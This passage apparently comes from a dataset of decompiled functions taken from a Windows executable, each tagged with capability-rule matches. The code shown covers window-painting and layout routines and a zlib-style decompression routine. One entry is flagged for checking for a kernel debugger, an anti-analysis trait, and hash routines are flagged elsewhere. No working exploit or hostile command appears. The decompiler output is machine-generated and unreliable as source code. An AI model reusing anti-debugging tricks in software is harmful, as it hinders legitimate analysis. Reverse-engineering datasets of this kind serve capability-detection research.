0x55) & 4) == 0)) &&\n           ((((*(iVar1 + 0x18) & 1) == 0 && (*(iVar1 + 0x10) != 0)) && (*(iVar1 + 0x14) != 0)))) {\n            fcn.00451b80();\n        }\n    }\n    return;\n}\n",
        "token_count": 444
    },
    "004538d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004538d4(uint arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    int32_t *in_EAX;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_24h = *arg_10h;\n    uStack36 = arg_10h[1];\n    uStack32 = arg_10h[2];\n    uStack28 = arg_10h[3];\n    var_4h = in_EAX;\n    if ((arg_14h == 0) || (*(arg_14h + 0x492658) != *(in_EDX + 0x61))) {\n        if ((*(in_EDX + 0x175) != 0) && (*(in_EDX + 0x179) != 0)) {\n            var_8h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_ch = (**(**(in_EDX + 0x78) + 0x10))();\n            var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n            var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n            if ((*(in_EDX + 0x61) & 4) == 0) {\n                if ((*(in_EDX + 0x61) & 1) == 0) {\n                    var_24h = *(in_EDX + 0x165);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 1) == 0) {\n                var_8h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            else {\n                var_10h = *in_ECX - (*(in_EDX + 0x175) - *(in_EDX + 0x165));\n            }\n            if ((*(in_EDX + 0x61) & 8) == 0) {\n                if ((*(in_EDX + 0x61) & 2) == 0) {\n                    var_24h = *(in_EDX + 0x169);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            else if ((*(in_EDX + 0x61) & 2) == 0) {\n                var_ch = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            else {\n                var_14h = in_ECX[1] - (*(in_EDX + 0x179) - *(in_EDX + 0x169));\n            }\n            if (arg_8h != '\\0') {\n                if (*0x453cac != (*0x453ca8 & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x16d);\n                    var_8h = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_10h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_10h & 1) != 0);\n                    }\n                    var_8h = var_8h - iVar1;\n                }\n                if (*0x453cac != (*0x453cb0 & *(in_EDX + 0x61))) {\n                    var_24h = *(in_EDX + 0x171);\n                    var_ch = sub.kernel32.dll_MulDiv();\n                    iVar1 = var_14h >> 1;\n                    if (iVar1 < 0) {\n                        iVar1 = iVar1 + ((var_14h & 1) != 0);\n                    }\n                    var_ch = var_ch - iVar1;\n                }\n            }\n            fcn.0045ddc4(1, var_14h, var_10h);\n        }\n        if (arg_14h == 0) {\n            return;\n        }\n    }\n    var_10h = arg_ch[2] - *arg_ch;\n    if (((var_10h < 0) || (arg_14h - 3 < 2)) || (arg_14h == 6)) {\n        var_10h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_14h = arg_ch[3] - arg_ch[1];\n    if (((var_14h < 0) || (arg_14h - 1 < 2)) || (arg_14h == 6)) {\n        var_14h = (**(**(in_EDX + 0x78) + 0x10))();\n    }\n    var_8h = *arg_ch;\n    var_ch = arg_ch[1];\n    // switch table (7 cases) at 0x453b37\n    switch(arg_14h) {\n    case 1:\n        arg_ch[1] = arg_ch[1] + var_14h;\n        break;\n    case 2:\n        arg_ch[3] = arg_ch[3] - var_14h;\n        var_ch = arg_ch[3];\n        break;\n    case 3:\n        *arg_ch = *arg_ch + var_10h;\n        break;\n    case 4:\n        arg_ch[2] = arg_ch[2] - var_10h;\n        var_8h = arg_ch[2];\n        break;\n    case 6:\n        var_8h = *(in_EDX + 0x40);\n        var_ch = *(in_EDX + 0x44);\n        (**(*var_4h + 0xac))(&var_24h, arg_ch, &var_14h, &var_10h, &var_ch);\n    }\n    fcn.0045ddc4(1, var_14h, var_10h);\n    iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n    if ((iVar1 != var_10h) || (iVar1 = (**(**(in_EDX + 0x78) + 0x10))(),  iVar1 != var_14h)) {\n    // switch table (6 cases) at 0x453bff\n        switch(arg_14h) {\n        case 1:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[1] = arg_ch[1] - (var_14h - iVar1);\n            break;\n        case 2:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n            break;\n        case 3:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            *arg_ch = *arg_ch - (var_10h - iVar1);\n            break;\n        case 4:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            break;\n        case 5:\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[2] = arg_ch[2] + (var_10h - iVar1);\n            iVar1 = (**(**(in_EDX + 0x78) + 0x10))();\n            arg_ch[3] = arg_ch[3] + (var_14h - iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1924
    },
    "00454808": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454808(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x454926;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00403af4();\n    *param_2 = in_EAX[0x19];\n    param_2[1] = 0x44000000;\n    fcn.004547a0();\n    if ((*(in_EAX + 0x14) & 1) != 0) {\n        param_2[1] = param_2[1] | 0x2000000;\n        param_2[2] = param_2[2] | 0x10000;\n    }\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 == '\\0') {\n            param_2[1] = param_2[1] | 0x8000000;\n        }\n    }\n    if (*(in_EAX + 0x76) != '\\0') {\n        param_2[1] = param_2[1] | 0x10000;\n    }\n    param_2[3] = in_EAX[0x10];\n    param_2[4] = in_EAX[0x11];\n    param_2[5] = in_EAX[0x12];\n    param_2[6] = in_EAX[0x13];\n    if (in_EAX[0xc] == 0) {\n        param_2[7] = in_EAX[0x71];\n    }\n    else {\n        iVar2 = fcn.004585f8();\n        param_2[7] = iVar2;\n    }\n    param_2[9] = 0xb;\n    param_2[10] = sub.user32.dll_DefWindowProcA;\n    uVar3 = 0;\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    param_2[0xf] = iVar2;\n    param_2[0x10] = 0;\n    param_2[0xd] = *0x4977f8;\n    fcn.00404530();\n    fcn.00405794();\n    fcn.0040a928();\n    *in_FS_OFFSET = uVar3;\n    uStack288 = 0x45492d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 650
    },
    "004564d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004564d0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack148;\n    uint uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uVar3;\n    uint uStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint var_50h;\n    int32_t nXDest;\n    int32_t nHeight;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_10h;\n    uint hgdiobj;\n    uint hdc;\n    int32_t *var_4h;\n    \n    if ((*(in_EAX + 0x90) != '\\0') && (*(param_2 + 4) == 0)) {\n        puStack96 = 0x456527;\n        cVar1 = fcn.0042fb10();\n        if (cVar1 == '\\0') {\n            puStack96 = &fcn.004564d0::var_50h;\n            uStack100 = 0x4565e9;\n            uStack100 = fcn.004585f8();\n            puStack104 = 0x4565ef;\n            uVar3 = sub.user32.dll_BeginPaint();\n            puStack104 = var_3ch - nHeight;\n            iStack108 = var_40h - nXDest;\n            uStack112 = uVar3;\n            hgdiobj = sub.gdi32.dll_CreateCompatibleBitmap();\n            *in_FS_OFFSET = &stack0xffffff84;\n            uStack132 = 0x45661c;\n            uStack136 = sub.gdi32.dll_CreateCompatibleDC();\n            uStack132 = hgdiobj;\n            puStack140 = 0x45662c;\n            hdc = uStack136;\n            var_10h = sub.gdi32.dll_SelectObject();\n            uStack144 = 0x4566b9;\n            uStack148 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff6c;\n            puStack140 = &stack0xfffffffc;\n            sub.gdi32.dll_SetWindowOrgEx(hdc, nXDest, nHeight, 0);\n            fcn.00451b4c(hdc);\n            *(param_2 + 4) = hdc;\n            fcn.004564d0();\n            *(param_2 + 4) = 0;\n            sub.gdi32.dll_BitBlt\n                      (uVar3, nXDest, nHeight, var_40h - nXDest, var_3ch - nHeight, hdc, nXDest, nHeight, 0xcc0020);\n            *in_FS_OFFSET = uVar3;\n            sub.gdi32.dll_SelectObject(hdc, var_10h, 0x4566c0);\n            return;\n        }\n        puStack96 = &fcn.004564d0::var_50h;\n        uStack100 = 0x45653b;\n        uStack100 = fcn.004585f8();\n        puStack104 = 0x456541;\n        sub.user32.dll_BeginPaint();\n        iStack108 = 0x4565d6;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        puStack104 = &stack0xfffffffc;\n        fcn.0042eed4(&fcn.004564d0::hdc, 0);\n        fcn.00451b4c(hdc);\n        uVar3 = 4;\n        uStack132 = 0x45658e;\n        fcn.00451b4c(4);\n        uStack132 = 0x45659c;\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            uStack132 = 0x4565ac;\n            fcn.0042efcc();\n        }\n        uStack132 = 0x4565b6;\n        fcn.0042ef60();\n        *in_FS_OFFSET = uVar3;\n        fcn.004585f8();\n        uStack132 = 0x4565d5;\n        sub.user32.dll_EndPaint();\n        return;\n    }\n    if ((*(in_EAX + 0x55) & 1) == 0) {\n        puStack96 = 0x456500;\n        var_4h = in_EAX;\n        iVar2 = fcn.004546e8();\n        if (iVar2 == 0) {\n            puStack96 = 0x45650e;\n            (**(*var_4h + -0x10))();\n            return;\n        }\n    }\n    puStack96 = 0x45651d;\n    fcn.00455d50();\n    return;\n}\n",
        "token_count": 1085
    },
    "004569f4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004569f4(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    \n    if ((*0x456a44 == (*0x456a40 & *(in_EAX + 7))) && (iVar2 = *(param_2 + 8),  (*(iVar2 + 0x18) & 1) == 0)) {\n        cVar3 = fcn.00452590();\n        if (cVar3 == '\\0') {\n            puVar1 = iVar2 + 0x18;\n            *puVar1 = *puVar1 | 1;\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 183
    },
    "00456a48": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00456a48(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00458910();\n    fcn.0045342c();\n    (**(*in_EAX + -0x10))();\n    fcn.0045422c();\n    if ((*(in_EAX + 7) & 1) == 0) {\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0045761c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0045761c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.004546e8(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.004546ac();\n            if (((*(piVar3 + 0x57) != '\\0') && (cVar1 = (**(*piVar3 + 0x50))(),  cVar1 != '\\0')) &&\n               ((((*(piVar3 + 0x52) & 1) != 0 && (iVar4 = fcn.00451b4c(*(*(arg_8h + -4) + 8)),  iVar4 != 0)) ||\n                ((cVar1 = fcn.004047dc(),  cVar1 != '\\0' && (cVar1 = fcn.0045761c(arg_8h),  cVar1 != '\\0')))))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 304
    },
    "004593bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004593bc(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    \n    (**(*in_EAX + -0x10))();\n    piVar1 = *(param_2 + 8);\n    sub.user32.dll_InflateRect(piVar1, -in_EAX[0x67], -in_EAX[0x67]);\n    if (*(in_EAX + 0x195) != '\\0') {\n        iVar2 = 0;\n        if (*(in_EAX + 0x193) != '\\0') {\n            iVar2 = in_EAX[0x66];\n        }\n        if (*(in_EAX + 0x65) != '\\0') {\n            iVar2 = iVar2 + in_EAX[0x66];\n        }\n        if ((*(in_EAX + 0x192) & 1) != 0) {\n            *piVar1 = *piVar1 + iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 2) != 0) {\n            piVar1[1] = piVar1[1] + iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 4) != 0) {\n            piVar1[2] = piVar1[2] - iVar2;\n        }\n        if ((*(in_EAX + 0x192) & 8) != 0) {\n            piVar1[3] = piVar1[3] - iVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 364
    },
    "0045944c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045944c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint dx;\n    uint var_38h;\n    int32_t lprcSrc1;\n    int32_t dy;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    uint hDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = param_2;\n    var_4h = in_EAX;\n    if ((*(in_EAX + 0x195) == '\\0') && (in_EAX[0x67] == 0)) {\n        uStack80 = 0x459711;\n        (**(*in_EAX + -0x10))();\n        uStack80 = 0x459719;\n        cVar3 = fcn.00432a84();\n        if ((cVar3 != '\\0') && ((*(var_4h + 0x52) & 2) != 0)) {\n            uStack80 = 0x45972b;\n            fcn.00432228();\n            uStack80 = 0x459735;\n            fcn.004328fc();\n        }\n        return;\n    }\n    uStack80 = 0x45947f;\n    uStack80 = fcn.004585f8();\n    puStack84 = 0x459485;\n    hDC = sub.user32.dll_GetWindowDC();\n    uStack88 = 0x4596ff;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar4 = fcn.004585f8(&fcn.0045944c::nLeftRect);\n    sub.user32.dll_GetClientRect(uVar4);\n    uVar4 = fcn.004585f8(&fcn.0045944c::lprcSrc1);\n    sub.user32.dll_GetWindowRect(uVar4);\n    uVar4 = fcn.004585f8(&fcn.0045944c::lprcSrc1, 2);\n    sub.user32.dll_MapWindowPoints(0, uVar4);\n    sub.user32.dll_OffsetRect(&fcn.0045944c::nLeftRect, -lprcSrc1, -dy);\n    sub.gdi32.dll_ExcludeClipRect(hDC, nLeftRect, nTopRect, nRightRect, nBottomRect);\n    iVar2 = dy;\n    iVar1 = lprcSrc1;\n    sub.user32.dll_InflateRect(&fcn.0045944c::nLeftRect, var_4h[0x67], var_4h[0x67]);\n    lprcSrc1 = nLeftRect;\n    dy = nTopRect;\n    var_24h = nRightRect;\n    var_20h = nBottomRect;\n    uVar4 = fcn.004585f8(0xfffffff0);\n    uVar5 = sub.user32.dll_GetWindowLongA(uVar4);\n    if ((uVar5 & 0x200000) != 0) {\n        iVar6 = (***0x494970)(0x14);\n        var_24h = var_24h + iVar6;\n    }\n    if ((uVar5 & 0x100000) != 0) {\n        iVar6 = (***0x494970)(0x15);\n        var_20h = var_20h + iVar6;\n    }\n    if (*(var_4h + 0x195) != '\\0') {\n        iVar6 = 0;\n        if (*(var_4h + 0x193) != 0) {\n            iVar6 = var_4h[0x66];\n        }\n        if (*(var_4h + 0x65) != 0) {\n            iVar6 = iVar6 + var_4h[0x66];\n        }\n        if ((*(var_4h + 0x192) & 1) != 0) {\n            lprcSrc1 = lprcSrc1 - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 2) != 0) {\n            dy = dy - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 4) != 0) {\n            var_24h = var_24h + iVar6;\n        }\n        if ((*(var_4h + 0x192) & 8) != 0) {\n            var_20h = var_20h + iVar6;\n        }\n        sub.user32.dll_DrawEdge\n                  (hDC, &fcn.0045944c::lprcSrc1, \n                   *((*(var_4h + 0x193) & 0x7f) * 4 + 0x49271c) | *((*(var_4h + 0x65) & 0x7f) * 4 + 0x49272c), \n                   *(var_4h + 0x192) | *(*(var_4h + 0x195) * 4 + 0x49273c) | *(*(var_4h + 0x1d9) * 4 + 0x49274c) |\n                   0x2000);\n    }\n    sub.gdi32.dll_IntersectClipRect(hDC, lprcSrc1, dy, var_24h, var_20h);\n    if (*(var_8h + 4) == 1) {\n        sub.user32.dll_OffsetRect(&fcn.0045944c::lprcSrc1, -iVar1, -iVar2);\n    }\n    else {\n        sub.gdi32.dll_GetRgnBox(*(var_8h + 4), &fcn.0045944c::nLeftRect);\n        uVar4 = fcn.004585f8(&fcn.0045944c::nLeftRect, 2);\n        sub.user32.dll_MapWindowPoints(0, uVar4);\n        sub.user32.dll_IntersectRect(&fcn.0045944c::lprcSrc1, &fcn.0045944c::lprcSrc1, &fcn.0045944c::nLeftRect);\n        sub.user32.dll_OffsetRect(&fcn.0045944c::lprcSrc1, -iVar1, -iVar2);\n    }\n    uVar7 = fcn.00424fec();\n    uVar4 = hDC;\n    sub.user32.dll_FillRect(hDC, &fcn.0045944c::lprcSrc1, uVar7);\n    *in_FS_OFFSET = uVar4;\n    uVar4 = fcn.004585f8(hDC, 0x459706);\n    sub.user32.dll_ReleaseDC(uVar4);\n    return;\n}\n",
        "token_count": 1623
    },
    "00459800": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459800(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 1) {\n        uStack20 = 0x459886;\n        (**(*in_EAX + -0x10))();\n    }\n    else {\n        if (((*(param_2 + 8) & 1) == 0) || (*(in_EAX + 0x57) != '\\0')) {\n            uStack20 = *(param_2 + 4);\n            puStack24 = 0x459830;\n            uVar1 = sub.gdi32.dll_SaveDC();\n            uStack28 = 0x459869;\n            uStack32 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe0;\n            puStack24 = &stack0xfffffffc;\n            fcn.00455d50();\n            *in_FS_OFFSET = uStack32;\n            puStack24 = 0x459886;\n            uStack32 = *(param_2 + 4);\n            uStack28 = uVar1;\n            sub.gdi32.dll_RestoreDC();\n            return;\n        }\n        uStack20 = 0x45987a;\n        (**(*in_EAX + -0x10))();\n    }\n    return;\n}\n",
        "token_count": 346
    },
    "00469b90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00469b90(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint8_t *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    ushort uVar6;\n    uint8_t **in_EAX;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    uint8_t *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint8_t *arg_ch;\n    uint8_t *puVar14;\n    uint8_t *puStack48;\n    uint32_t uStack44;\n    uint8_t *puStack36;\n    uint8_t *puStack32;\n    uint uStack28;\n    char cStack24;\n    uint8_t uStack23;\n    int32_t iStack20;\n    \n    if ((((in_EAX == NULL) || (in_EAX[7] == NULL)) || (in_EAX[3] == NULL)) || ((*in_EAX == NULL && (in_EAX[1] != NULL)))\n       ) {\n        return -2;\n    }\n    piVar2 = in_EAX[7];\n    if (*piVar2 == 3) {\n        *piVar2 = 4;\n    }\n    puVar9 = in_EAX[3];\n    puStack48 = in_EAX[4];\n    puVar3 = in_EAX[1];\n    uStack44 = piVar2[0xd];\n    arg_ch = *in_EAX;\n    uVar13 = piVar2[0xe];\n    iStack20 = 0;\n    puVar14 = puVar3;\n    puStack36 = puStack48;\n    do {\n    // switch table (21 cases) at 0x469c2f\n        switch(*piVar2) {\n        case 0:\n            if (piVar2[2] == 0) {\n                *piVar2 = 4;\n            }\n            else {\n                for (; uVar13 < 0x10; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x0046a936;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                if (((uStack44 & 0xff) * 0x100 + (uStack44 >> 8)) % 0x1f == 0) {\n                    if ((uStack44 & 0xf) == 8) {\n                        uStack44 = uStack44 >> 4;\n                        uVar13 = uVar13 - 4;\n                        uVar12 = (uStack44 & 0xf) + 8;\n                        if (uVar12 < piVar2[8] || uVar12 == piVar2[8]) {\n                            piVar2[5] = 1 << uVar12;\n                            puVar7 = fcn.0046797c();\n                            piVar2[6] = puVar7;\n                            in_EAX[0xc] = puVar7;\n                            if ((uStack44 & 0x200) == 0) {\n                                iVar8 = 3;\n                            }\n                            else {\n                                iVar8 = 1;\n                            }\n                            *piVar2 = iVar8;\n                            uVar13 = 0;\n                            uStack44 = 0;\n                        }\n                        else {\n                            in_EAX[6] = \"invalid window size\";\n                            *piVar2 = 0x12;\n                        }\n                    }\n                    else {\n                        in_EAX[6] = \"unknown compression method\";\n                        *piVar2 = 0x12;\n                    }\n                }\n                else {\n                    in_EAX[6] = \"incorrect header check\";\n                    *piVar2 = 0x12;\n                }\n            }\n            break;\n        case 1:\n            for (; uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x0046a936;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            puVar7 = (uStack44 >> 0x18) + (uStack44 >> 8 & 0xff00) + (uStack44 & 0xff00) * 0x100 + uStack44 * 0x1000000;\n            piVar2[6] = puVar7;\n            in_EAX[0xc] = puVar7;\n            uVar13 = 0;\n            uStack44 = 0;\n            *piVar2 = 2;\n        case 2:\n            if (piVar2[3] == 0) {\n                in_EAX[3] = puVar9;\n                in_EAX[4] = puStack48;\n                *in_EAX = arg_ch;\n                in_EAX[1] = puVar14;\n                piVar2[0xd] = uStack44;\n                piVar2[0xe] = uVar13;\n                return 2;\n            }\n            puVar7 = fcn.0046797c();\n            piVar2[6] = puVar7;\n            in_EAX[0xc] = puVar7;\n            *piVar2 = 3;\ncode_r0x00469e41:\n            if (param_2 == 5) goto code_r0x0046a936;\ncode_r0x00469e4c:\n            if (piVar2[1] == 0) {\n                for (; uVar13 < 3; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x0046a936;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                piVar2[1] = uStack44 & 1;\n                uVar12 = uStack44 >> 1 & 3;\n                if (uVar12 == 0) {\n                    *piVar2 = 5;\n                }\n                else if (uVar12 == 1) {\n                    fcn.00469a6c();\n                    *piVar2 = 10;\n                }\n                else if (uVar12 == 2) {\n                    *piVar2 = 7;\n                }\n                else if (uVar12 == 3) {\n                    in_EAX[6] = \"invalid block type\";\n                    *piVar2 = 0x12;\n                }\n                uStack44 = uStack44 >> 3;\n                uVar13 = uVar13 - 3;\n            }\n            else {\n                uStack44 = uStack44 >> (uVar13 & 7);\n                uVar13 = uVar13 - (uVar13 & 7);\n                *piVar2 = 0x10;\n            }\n            break;\n        case 3:\n            goto code_r0x00469e41;\n        case 4:\n            goto code_r0x00469e4c;\n        case 5:\n            uStack44 = uStack44 >> (uVar13 & 7);\n            for (uVar13 = uVar13 - (uVar13 & 7); uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x0046a936;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            if ((uStack44 & 0xffff) == (uStack44 >> 0x10 ^ 0xffff)) {\n                piVar2[0xf] = uStack44 & 0xffff;\n                uVar13 = 0;\n                uStack44 = 0;\n                *piVar2 = 6;\n                goto code_r0x00469f63;\n            }\n            in_EAX[6] = \"invalid stored block lengths\";\n            *piVar2 = 0x12;\n            break;\n        case 6:\ncode_r0x00469f63:\n            puStack32 = piVar2[0xf];\n            if (puStack32 == NULL) {\n                *piVar2 = 3;\n            }\n            else {\n                if (puVar14 < puStack32) {\n                    puStack32 = puVar14;\n                }\n                if (puStack48 < puStack32) {\n                    puStack32 = puStack48;\n                }\n                if (puStack32 == NULL) goto code_r0x0046a936;\n                fcn.004676d0(puVar9, arg_ch, puStack32);\n                puVar14 = puVar14 + -puStack32;\n                arg_ch = arg_ch + puStack32;\n                puStack48 = puStack48 + -puStack32;\n                puVar9 = puVar9 + puStack32;\n                piVar2[0xf] = piVar2[0xf] - puStack32;\n            }\n            break;\n        case 7:\n            for (; uVar13 < 0xe; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x0046a936;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            piVar2[0x17] = (uStack44 & 0x1f) + 0x101;\n            piVar2[0x18] = (uStack44 >> 5 & 0x1f) + 1;\n            piVar2[0x16] = (uStack44 >> 10 & 0xf) + 4;\n            uStack44 = uStack44 >> 0xe;\n            uVar13 = uVar13 - 0xe;\n            if ((piVar2[0x17] < 0x11f) && (piVar2[0x18] < 0x1f)) {\n                piVar2[0x19] = 0;\n                *piVar2 = 8;\n                goto code_r0x0046a0b7;\n            }\n            in_EAX[6] = \"too many length or distance symbols\";\n            *piVar2 = 0x12;\n            break;\n        case 8:\ncode_r0x0046a0b7:\n            while (piVar2[0x19] < piVar2[0x16]) {\n                for (; uVar13 < 3; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x0046a936;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                iVar8 = piVar2[0x19];\n                piVar2[0x19] = piVar2[0x19] + 1;\n                *(piVar2 + *(iVar8 * 2 + 0x4934a4) * 2 + 0x6c) = uStack44 & 7;\n                uStack44 = uStack44 >> 3;\n                uVar13 = uVar13 - 3;\n            }\n            while (piVar2[0x19] < 0x13) {\n                iVar8 = piVar2[0x19];\n                piVar2[0x19] = piVar2[0x19] + 1;\n                *(piVar2 + *(iVar8 * 2 + 